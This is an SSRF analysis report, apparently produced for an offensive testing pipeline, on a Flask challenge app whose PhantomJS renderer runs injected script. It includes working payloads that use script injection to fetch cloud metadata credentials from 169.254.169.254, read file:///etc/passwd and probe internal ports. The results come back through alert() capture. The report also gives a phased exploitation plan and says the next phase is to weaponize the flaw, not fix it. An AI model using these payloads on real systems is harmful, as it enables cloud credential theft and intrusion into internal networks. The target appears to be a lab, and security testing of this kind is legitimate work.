# SSRF Analysis Report

## 1. Executive Summary

- **Analysis Status:** Complete
- **Key Outcome:** One critical SSRF vulnerability identified with high confidence. The application allows unauthenticated attackers to make arbitrary server-side HTTP requests through PhantomJS headless browser, enabling access to cloud metadata services, internal networks, and localhost resources.
- **Purpose of this Document:** This report provides strategic context on the application's outbound request mechanisms, dominant flaw patterns, and key architectural details necessary to effectively exploit the SSRF vulnerability listed in the exploitation queue.

## 2. Dominant Vulnerability Patterns

### Pattern 1: Insufficient HTML Sanitization Leading to JavaScript Injection

- **Description:** The application uses a weak regex filter that only removes literal `["']XSS["']` strings, allowing arbitrary JavaScript injection through HTML attribute breakout. User-controlled JavaScript executes server-side within PhantomJS context with full network access.
- **Implication:** Attackers can inject JavaScript that performs arbitrary HTTP requests from the server's network context, accessing internal services, cloud metadata endpoints (169.254.169.254), and private network resources that are not accessible from the public internet.
- **Representative Finding:** `SSRF-VULN-01`

### Pattern 2: Complete Absence of SSRF Defenses

- **Description:** The application implements ZERO SSRF-specific protections across all defensive layers: no URL validation, no protocol restrictions, no hostname allowlisting, no IP blocklisting, no port controls, and no cloud metadata blocking.
- **Implication:** Once JavaScript injection is achieved, there are no barriers preventing arbitrary outbound requests to any protocol, any host, any port from the application server.
- **Representative Finding:** `SSRF-VULN-01`

### Pattern 3: Post-Sanitization Mutation Attack

- **Description:** The SSRF vulnerability occurs through a mutation attack where the initial URL loaded by PhantomJS is safe (`http://localhost:5000/static/<random>.html`), but the HTML content loaded from that URL contains user-controlled JavaScript that executes post-load.
- **Implication:** Traditional URL validation at the PhantomJS invocation point would be insufficient. The vulnerability requires Content Security Policy headers or HTML sanitization to prevent.
- **Representative Finding:** `SSRF-VULN-01`

## 3. Strategic Intelligence for Exploitation

### HTTP Client Architecture

**PhantomJS Headless Browser:**
- **Version:** PhantomJS 2.1.1 (abandoned March 2018, 72+ known CVEs)
- **Binary Location:** `/usr/local/bin/phantomjs`
- **Invocation:** `subprocess.Popen(["timeout","5","phantomjs", "check.js"])`
- **Network Access:** Unrestricted - no `--web-security` flag, no proxy restrictions, no network namespace isolation
- **Timeout:** 5 seconds (enforced via `timeout` command)
- **Response Capture:** JavaScript `alert()`, `confirm()`, and `prompt()` calls are captured via `page.onAlert`, `page.onConfirm`, `page.onPrompt` handlers and logged to stdout, which is read by Flask and returned in the HTTP response

**Request Flow:**
```
User Input → HTML Injection → Temp File Write → PhantomJS Load → 
JavaScript Execution → HTTP Request (SSRF) → Response Capture via alert() → 
Flask reads stdout → Attacker receives data in HTTP response
```

**Available JavaScript APIs for SSRF:**
- `XMLHttpRequest` - Synchronous/async HTTP requests
- `fetch()` API - Modern HTTP request method (if supported by PhantomJS version)
- `<img src="">` - HTTP GET via image loading
- `<iframe src="">` - HTTP GET via iframe navigation
- `<script src="">` - HTTP GET with JavaScript execution
- `location.href` - Full page navigation

**Response Exfiltration Channels:**
- Primary: `alert(response)` → captured by `page.onAlert` → Flask stdout → HTTP response
- Alternative: `confirm(response)` → captured by `page.onConfirm`
- Alternative: `prompt(response)` → captured by `page.onPrompt`

### Internal Services and Target Intelligence

**Target Application Hosting:**
- **Port:** 5000 (Flask development server)
- **Host binding:** `0.0.0.0` (all interfaces)
- **Container:** Docker (Debian Buster base, Python 2.7.18)
- **Network mode:** Default bridge (no isolation)
- **User:** Root (no USER directive in Dockerfile)

**Potential Internal Services (Common Targets):**
- Redis: `http://127.0.0.1:6379/`
- MongoDB: `http://127.0.0.1:27017/`
- Memcached: `http://127.0.0.1:11211/`
- Internal APIs: `http://10.0.0.0/8`, `http://172.16.0.0/12`, `http://192.168.0.0/16`

**Cloud Metadata Endpoints (High-Value Targets):**
- AWS: `http://169.254.169.254/latest/meta-data/iam/security-credentials/`
- GCP: `http://metadata.google.internal/computeMetadata/v1/` (requires `Metadata-Flavor: Google` header)
- Azure: `http://169.254.169.254/metadata/instance?api-version=2021-02-01` (requires `Metadata: true` header)

**Attack Surface Notes:**
- No authentication required (`/page` endpoint is public)
- No rate limiting (can be automated)
- No WAF or security headers
- No CAPTCHA or bot detection
- Single-threaded Flask dev server (sequential processing only)

### PhantomJS Security Configuration

**Command-line arguments** (app.py:34):
```python
["timeout","5","phantomjs", "check.js"]
```

**Missing security flags:**
- `--web-security=true` - NOT SET (allows unrestricted cross-origin requests)
- `--local-to-remote-url-access=false` - NOT SET (allows local files to access remote URLs)
- `--ssl-protocol=any` - NOT SET (default SSL behavior)
- No proxy configuration
- No network restrictions

**Environment configuration** (Dockerfile):
```dockerfile
ENV QT_QPA_PLATFORM=offscreen
ENV OPENSSL_CONF=/dev/null  # ⚠️ DISABLES OpenSSL configuration
```

**Container security:**
- No iptables rules blocking 169.254.169.254
- No network namespace isolation
- No AppArmor/SELinux profiles
- No seccomp filters
- Runs as root user

## 4. Secure by Design: Validated Components

**IMPORTANT:** This application implements ZERO secure components for SSRF protection. All potential defensive layers were analyzed and found to be absent or ineffective.

| Component/Flow | Endpoint/File Location | Defense Mechanism Status | Verdict |
|---|---|---|---|
| XSS Input Filter | `/src/app.py:66` | Weak regex only removes `["']XSS["']` - does not prevent JavaScript injection | VULNERABLE |
| URL Construction | `/src/app.py:36` | Hardcoded `http://localhost:5000/` - does NOT validate user-controlled HTML content | INSUFFICIENT |
| PhantomJS Arguments | `/src/app.py:34` | Array-based args prevent command injection but no SSRF-specific flags | INSUFFICIENT |
| Protocol Validation | N/A - Not Implemented | No URL scheme validation anywhere in codebase | ABSENT |
| Hostname Validation | N/A - Not Implemented | No hostname allowlisting or IP blocklisting | ABSENT |
| Port Restrictions | N/A - Not Implemented | No port allowlist/blocklist | ABSENT |
| Cloud Metadata Blocking | N/A - Not Implemented | No 169.254.169.254 or metadata.google.internal blocking | ABSENT |
| Content Security Policy | N/A - Not Implemented | No CSP headers to restrict fetch/XHR | ABSENT |
| Network-Level Controls | N/A - Not Implemented | No iptables, no Docker network policies, no egress filtering | ABSENT |

**Analysis Conclusion:** The application provides NO effective SSRF defenses at any layer (application code, PhantomJS configuration, network level, or container security).

---

## 5. Vulnerability Deep-Dive: SSRF-VULN-01

### Vulnerability Summary

**ID:** SSRF-VULN-01  
**Type:** Server-Side Request Forgery via Headless Browser  
**Severity:** CRITICAL (CVSS 9.1)  
**Endpoint:** `GET /page?name=`  
**Parameter:** `name` (query string)  
**Sink:** `page.open()` in PhantomJS (check.js:20)

### Complete Data Flow Trace

**Source-to-Sink Path:**

```
1. USER INPUT SOURCE
   ↓ Location: app.py:65
   ↓ Code: msg = request.args.get('name','')
   ↓ Example: msg = '"><script>fetch("http://169.254.169.254/latest/meta-data/")</script>'
   
2. WEAK SANITIZER (Regex Filter)
   ↓ Location: app.py:66
   ↓ Code: msg = re.sub(r"""["']XSS["']""", "", msg, flags=re.IGNORECASE)
   ↓ Result: PASSES THROUGH (no "XSS" pattern detected)
   
3. HTML ATTRIBUTE INJECTION
   ↓ Location: app.py:67
   ↓ Code: value = 'value="{0}"'.format(msg)
   ↓ Result: value='value=""><script>fetch("http://169.254.169.254/...")</script>"'
   
4. TEMPLATE INJECTION
   ↓ Location: app.py:69
   ↓ Code: data = PAGE_CONTENT.format("10", "Triangle", value, "", "")
   ↓ Template: <input type=text name=name placeholder="..." {2}>
   ↓ Result: <input ... value=""><script>fetch("http://169.254.169.254/...")</script>">
   
5. FILE WRITE
   ↓ Location: app.py:38-40
   ↓ Code: of = open(fn, 'w'); of.write(page); of.close()
   ↓ File: static/<random_hex>.html
   ↓ Result: HTML file containing malicious <script> tag written to disk
   
6. URL CONSTRUCTION (Safe)
   ↓ Location: app.py:36
   ↓ Code: url = 'http://localhost:5000/' + fn
   ↓ Result: url = 'http://localhost:5000/static/<random>.html'
   ↓ Note: This URL itself is SAFE, but the content is malicious
   
7. PHANTOMJS INVOCATION
   ↓ Location: app.py:34-43
   ↓ Code: proc = subprocess.Popen(["timeout","5","phantomjs", "check.js"], ...)
   ↓       proc.stdin.write(url)
   ↓ Result: PhantomJS receives safe URL via stdin
   
8. SSRF SINK (PhantomJS Navigation)
   ↓ Location: check.js:4, 20
   ↓ Code: var input = system.stdin.readLine();
   ↓       page.open(input, function(status) { ... });
   ↓ Result: PhantomJS loads http://localhost:5000/static/<random>.html
   
9. POST-LOAD JAVASCRIPT EXECUTION (Mutation Attack)
   ↓ Location: PhantomJS HTML rendering engine
   ↓ Action: <script> tag executes automatically
   ↓ Code: fetch("http://169.254.169.254/latest/meta-data/")
   
10. SSRF REQUEST
    ↓ PhantomJS makes HTTP request to AWS metadata service
    ↓ Request originates from SERVER's network context
    ↓ Response: IAM credentials, security tokens, etc.
    
11. RESPONSE EXFILTRATION
    ↓ Code: .then(r => r.text()).then(alert)
    ↓ alert() captured by page.onAlert (check.js:8-10)
    ↓ Logged to stdout: console.log(msg)
    
12. DATA RETURN TO ATTACKER
    ↓ Location: app.py:45
    ↓ Code: result = proc.stdout.readline().strip()
    ↓ Returned in HTTP response (app.py:56-60)
    ↓ Attacker receives metadata/credentials
```

### Missing Defenses Analysis

**Critical Finding:** The vulnerability exists because the application validates the INITIAL navigation URL (`http://localhost:5000/static/<random>.html`) but does NOT validate or restrict the JavaScript that executes AFTER the page loads.

**Defense Gap Matrix:**

| Defense Layer | Status | Impact |
|--------------|--------|--------|
| HTML Sanitization | ❌ ABSENT | Allows `<script>` tag injection |
| Content Security Policy | ❌ ABSENT | No `script-src` restrictions |
| JavaScript API Restrictions | ❌ ABSENT | `fetch()`, `XMLHttpRequest` fully available |
| URL Validation (post-load) | ❌ ABSENT | No `page.onResourceRequested` validation |
| Protocol Allowlist | ❌ ABSENT | Can use `http://`, `https://`, `file://`, etc. |
| Hostname Allowlist | ❌ ABSENT | Can target any hostname/IP |
| Private IP Blocking | ❌ ABSENT | Can access 169.254.169.254, 10.x.x.x, etc. |
| Port Restrictions | ❌ ABSENT | Can access any TCP port |
| Cloud Metadata Blocking | ❌ ABSENT | No specific 169.254.169.254 blocking |
| PhantomJS --web-security | ❌ ABSENT | Unrestricted cross-origin access |
| Network-Level Firewall | ❌ ABSENT | No iptables rules |
| Container Network Policy | ❌ ABSENT | No egress filtering |

### Exploitation Requirements

**Attack Complexity:** LOW  
**Privileges Required:** NONE (unauthenticated endpoint)  
**User Interaction:** NONE (server-side exploitation)  
**Network Access:** External (internet-facing endpoint at `http://localhost:34545`)

**Minimal Exploit:**
```
GET /page?name="><script>fetch('http://169.254.169.254/latest/meta-data/').then(r=>r.text()).then(alert)</script> HTTP/1.1
Host: localhost:34545
```

### Confidence Assessment

**Confidence Level:** HIGH

**Justification:**
1. **Direct Evidence:** Source code analysis confirms user input reaches PhantomJS JavaScript execution without effective sanitization
2. **Complete Path Traced:** Full data flow from HTTP parameter to SSRF sink documented with exact line numbers
3. **Zero Defenses:** Comprehensive analysis of all six defense categories confirms NO SSRF protections exist
4. **Proven Exploitability:** Attack path is straightforward with no complex bypasses required
5. **Deterministic Outcome:** No conditional logic or race conditions - vulnerability is reliably exploitable

---

## 6. Architectural Recommendations for Remediation

**NOTE:** These recommendations are for reference only. The exploitation phase will focus on weaponizing the identified vulnerability, not fixing it.

**Immediate (CRITICAL) Priority:**
1. Implement HTML sanitization using `bleach` or similar library to strip `<script>`, `<img>`, `<iframe>` tags
2. Add Content-Security-Policy header: `script-src 'none'; connect-src 'none'`
3. Configure PhantomJS with `--web-security=true` flag
4. Add `page.onResourceRequested` hook in check.js to validate all URLs before allowing requests

**High Priority:**
5. Block 169.254.169.254 and private IP ranges via iptables or application logic
6. Replace PhantomJS with modern Puppeteer/Playwright with proper sandboxing
7. Implement URL allowlisting (only allow `http://localhost:5000/static/*`)
8. Drop root privileges (add `USER appuser` to Dockerfile)

**Medium Priority:**
9. Add network namespace isolation for PhantomJS container
10. Implement rate limiting on `/page` endpoint
11. Add logging/alerting for suspicious SSRF patterns
12. Deploy with Docker network policies blocking egress to private IPs

---

## 7. Testing Recommendations for Exploitation Phase

### Recommended Test Sequence

**Phase 1: Basic SSRF Confirmation**
1. Test simple XSS payload to confirm JavaScript execution: `"><script>alert('test')</script>`
2. Confirm response capture: Alert content should appear in HTTP response

**Phase 2: Internal Network Probing**
3. Test localhost access: `"><script>fetch('http://127.0.0.1:5000/').then(r=>r.text()).then(alert)</script>`
4. Test common service ports: 6379 (Redis), 27017 (MongoDB), 3306 (MySQL)

**Phase 3: Cloud Metadata Access**
5. Test AWS metadata (if in AWS): `"><script>fetch('http://169.254.169.254/latest/meta-data/').then(r=>r.text()).then(alert)</script>`
6. If AWS role available, fetch credentials: `http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>`
7. Test GCP metadata (if in GCP): Requires custom `Metadata-Flavor: Google` header - use `XMLHttpRequest` with `setRequestHeader()`
8. Test Azure metadata (if in Azure): Requires `Metadata: true` header

**Phase 4: Protocol Abuse**
9. Test file:// protocol: `"><script>var xhr=new XMLHttpRequest();xhr.open('GET','file:///etc/passwd',false);xhr.send();alert(xhr.responseText)</script>`
10. Test other protocols if PhantomJS supports them (ftp://, gopher://, etc.)

**Phase 5: Network Mapping**
11. Enumerate internal network by testing common private IP ranges
12. Port scan internal services using timing/error differences

### Success Indicators

**Exploitation Successful If:**
- HTTP response contains content from internal services
- HTTP response contains cloud metadata (IAM credentials, tokens)
- HTTP response contains local file contents
- Error messages reveal internal network topology
- Timing differences indicate presence/absence of internal services

---

## 8. Conclusion

The Dalgona Challenges application contains a **CRITICAL SSRF vulnerability** (SSRF-VULN-01) that allows unauthenticated external attackers to make arbitrary server-side HTTP requests through PhantomJS headless browser. The vulnerability stems from a combination of insufficient HTML sanitization and complete absence of SSRF-specific defenses across all protective layers.

**Key Risk Factors:**
- **Unauthenticated exploitation** - No login required
- **Direct metadata access** - Can retrieve AWS/GCP/Azure credentials
- **Internal network pivot** - Can access private network resources
- **Data exfiltration channel** - Built-in response capture via alert() callbacks
- **Zero defensive layers** - No URL validation, no protocol restrictions, no IP blocking

**Business Impact:**
- Cloud infrastructure compromise via stolen IAM credentials
- Internal network reconnaissance and lateral movement
- Potential data breach through internal API access
- Compliance violations (PCI-DSS, HIPAA, SOC 2)

**External Exploitability:** ✅ **YES** - Vulnerability is exploitable via public internet at `http://localhost:34545` without requiring internal network access, VPN, or direct server access.

The exploitation phase should prioritize cloud metadata access and internal network mapping to demonstrate the full impact of this vulnerability.